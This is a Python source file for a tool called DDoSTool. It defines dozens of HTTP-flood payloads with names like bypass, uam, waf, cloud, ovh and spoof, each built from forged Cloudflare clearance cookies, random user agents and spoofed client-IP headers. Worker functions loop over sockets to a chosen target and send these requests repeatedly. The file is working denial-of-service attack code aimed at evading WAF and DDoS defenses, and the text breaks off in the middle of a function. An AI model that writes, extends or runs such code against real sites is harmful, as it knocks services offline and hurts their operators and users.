import socket
import threading
import random
import time
import os
import sys
import string
import ssl
from urllib.parse import urlparse
from random import choice as che, randint as ran
from fake_useragent import UserAgent
from datetime import datetime

try:
    from colorama import Fore, init
    init()
    red = Fore.LIGHTRED_EX
    green = Fore.LIGHTGREEN_EX
    blue = Fore.LIGHTBLUE_EX 
    yellow = Fore.LIGHTYELLOW_EX
    cyan = Fore.LIGHTCYAN_EX
    white = Fore.LIGHTWHITE_EX
    magenta = Fore.LIGHTMAGENTA_EX
except:
    red = green = blue = yellow = cyan = white = magenta = ""

app = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
]

reff = [
    'https://www.google.com/search?q=',
    'https://google.com/',
    'https://www.bing.com/',
    'https://www.youtube.com/'
]

class DDoSTool:
    def __init__(self):
        self.ua = UserAgent()
        self.running = False
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def generate_cookies(self):
        chars = string.ascii_letters + string.digits
        cf_clearance = ''.join(random.choice(chars) for _ in range(147))
        phpsessid = ''.join(random.choice(chars) for _ in range(32))
        return f"cf_clearance={cf_clearance}; PHPSESSID={phpsessid}"
    
    def spoof_ip(self):
        addr = [192, 168, 0, 1]
        addr[0] = str(ran(11, 197))
        addr[1] = str(ran(0, 255))
        addr[2] = str(ran(0, 255))
        addr[3] = str(ran(2, 254))
        return f"{addr[0]}.{addr[1]}.{addr[2]}.{addr[3]}"
    
    def strm(self, size):
        return '%0x' % ran(0, 16 ** size)

    def generate_payload_raw(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n\r\n".encode()

    def generate_payload_bypass(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: {che(app)}\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_mix(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: {che(app)}\r\nAccept-Ranges: bytes\r\nCache-Control: max-age=0\r\n\r\n".encode()

    def generate_payload_cloud(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nDNT: 1\r\nReferer: {che(reff)}\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_get(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: {che(app)}\r\nReferer: {che(reff)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n".encode()

    def generate_payload_uam(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Language: en-US,en;q=0.9\r\nConndection: keep-alive\r\nCache-Control: max-age=0\r\nSec-Fetch-Site: same-origin\r\nReferer: {target}\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_waf(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_ovh(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n".encode()

    def generate_payload_onec(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: {che(app)}\r\nCache-Control: max-age=0\r\nConnection: close\r\n\r\n".encode()

    def generate_payload_sky(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,\r\nCache-Cotrol:  max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_spoof(self, target, path):
        ipt = self.spoof_ip()
        return f"GET {path}?{self.strm(6)}={self.strm(6)}={self.strm(6)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nX-Originating-IP: {ipt}\r\nX-Forwarded-For: {ipt}\r\nX-Forwarded: {ipt}\r\nForwarded-For: {ipt}\r\nX-Forwarded-Host: {ipt}\r\nX-Remote-IP: {ipt}\r\nX-Remote-Addr: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nX-Original-URL: {ipt}\r\nClient-IP: {ipt}\r\nX-Client-IP: {ipt}\r\nTrue-Client-IP: {ipt}\r\nX-Host: {ipt}\r\nCluster-Client-IP: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nVia: 1.0 fred, 1.1 {ipt}\r\n\r\n".encode()

    def generate_payload_post(self, target, path):
        return f"POST {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nReferer: {che(reff)}\r\nContent-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n\r\n".encode()

    def generate_payload_rawplus(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: {che(app)}\r\nReferer: {che(reff)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_high(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_uamplus(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Language: en-US;q=0.6\r\nConnection: keep-alive\r\nReferer: {target}\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_tls(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US;q=0.6\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_http2(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US;q=0.6\r\nConnection: keep-alive\r\nPragma: no-cache\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_gurd(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nsec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: \"Windows\"\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_kill(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n".encode()

    def generate_payload_tlsv2(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n\r\n".encode()

    def generate_payload_null(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: */*\r\nCache-Cotrol: no-cache\r\nAccept-Encoding: null\r\nAccept-Language: null\r\n\r\n".encode()

    def generate_payload_killplus(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\nsec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: \"Windows\"\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_https(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_ir(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nReferer: {target}\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_war(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,\r\nCache-Cotrol: no-cache\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n".encode()

    def generate_payload_warplus(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,\r\nCache-Cotrol: no-cache\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_zeus(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUser-Agent: {self.ua.random}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nKeep-Alive: 115\r\nConnection: Keep-Alive\r\n\r\n".encode()

    def generate_payload_bypassplus(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUser-Agent: {self.ua.random}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_pro(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\nsec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: \"Windows\"\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_crash(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n".encode()

    def generate_payload_httpsplus(self, target, path):
        return f"GET {path} HTTP/1.2\r\nHost: {target}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUser-Agent: {self.ua.random}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_wafplus(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.8,en;q=0.7\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nPragma: no-cache\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\nsec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: \"Windows\"\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\nUpgrade-Insecure-Requests: 1\r\nTE: trailers\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def generate_payload_storm(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n\r\n".encode()

    def generate_payload_stormplus(self, target, path):
        return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {self.generate_cookies()}\r\n\r\n".encode()

    def raw(self, target, port, rpc, path):
        payload = self.generate_payload_raw(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def bypass(self, target, port, rpc, path):
        payload = self.generate_payload_bypass(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def mix(self, target, port, rpc, path):
        payload = self.generate_payload_mix(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def cloud(self, target, port, rpc, path):
        payload = self.generate_payload_cloud(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def get(self, target, port, rpc, path):
        payload = self.generate_payload_get(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def uam(self, target, port, rpc, path):
        payload = self.generate_payload_uam(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def waf(self, target, port, rpc, path):
        payload = self.generate_payload_waf(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def ovh(self, target, port, rpc, path):
        payload = self.generate_payload_ovh(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def onec(self, target, port, rpc, path):
        payload = self.generate_payload_onec(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def sky(self, target, port, rpc, path):
        payload = self.generate_payload_sky(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def spoof(self, target, port, rpc, path):
        payload = self.generate_payload_spoof(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def post(self, target, port, rpc, path):
        payload = self.generate_payload_post(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def rawplus(self, target, port, rpc, path):
        payload = self.generate_payload_rawplus(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def high(self, target, port, rpc, path):
        payload = self.generate_payload_high(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def uamplus(self, target, port, rpc, path):
        payload = self.generate_payload_uamplus(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def tls(self, target, port, rpc, path):
        payload = self.generate_payload_tls(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def http2(self, target, port, rpc, path):
        payload = self.generate_payload_http2(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def gurd(self, target, port, rpc, path):
        payload = self.generate_payload_gurd(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def kill(self, target, port, rpc, path):
        payload = self.generate_payload_kill(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def tlsv2(self, target, port, rpc, path):
        payload = self.generate_payload_tlsv2(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def null(self, target, port, rpc, path):
        payload = self.generate_payload_null(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def killplus(self, target, port, rpc, path):
        payload = self.generate_payload_killplus(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def https(self, target, port, rpc, path):
        payload = self.generate_payload_https(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def ir(self, target, port, rpc, path):
        payload = self.generate_payload_ir(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def war(self, target, port, rpc, path):
        payload = self.generate_payload_war(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def warplus(self, target, port, rpc, path):
        payload = self.generate_payload_warplus(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def zeus(self, target, port, rpc, path):
        payload = self.generate_payload_zeus(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def bypassplus(self, target, port, rpc, path):
        payload = self.generate_payload_bypassplus(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def pro(self, target, port, rpc, path):
        payload = self.generate_payload_pro(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                for _ in range(rpc):
                    s.send(payload)
                s.close()
            except:
                pass

    def crash(self, target, port, rpc, path):
        payload = self.generate_payload_crash(target, path)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
